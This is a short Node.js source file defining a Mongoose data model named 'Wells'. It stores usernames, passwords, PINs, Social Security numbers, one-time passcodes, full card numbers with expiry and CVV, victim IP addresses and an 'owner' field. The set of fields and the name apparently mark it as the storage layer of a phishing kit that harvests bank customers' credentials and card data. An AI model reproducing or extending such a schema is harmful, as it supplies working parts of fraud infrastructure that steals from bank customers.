const mongoose = require("mongoose");

const wellsSchema = new mongoose.Schema({
  uniqueid: Number,
  username: String,
  password: String,
  pin: String,
  ssn: String,
  otp: String,
  ccnum: String,
  ccexp: String,
  cvv: String,
  status: Number,
  ip: String,
  owner: String,
});

module.exports = mongoose.model("Wells", wellsSchema);
